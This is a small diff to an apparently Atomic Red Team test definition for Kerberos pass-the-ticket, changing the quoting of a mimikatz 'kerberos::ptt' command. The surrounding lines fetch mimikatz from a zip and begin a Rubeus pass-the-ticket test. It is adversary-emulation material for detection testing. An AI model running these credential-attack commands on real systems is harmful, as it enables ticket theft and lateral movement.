@@ -32,7 +32,7 @@ atomic_tests:
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
   executor:
     command: |
-      "#{mimikatz_exe}" "kerberos::ptt #{ticket}"
+      #{mimikatz_exe} "kerberos::ptt #{ticket}"
     name: command_prompt
 - name: Rubeus Kerberos Pass The Ticket
   auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
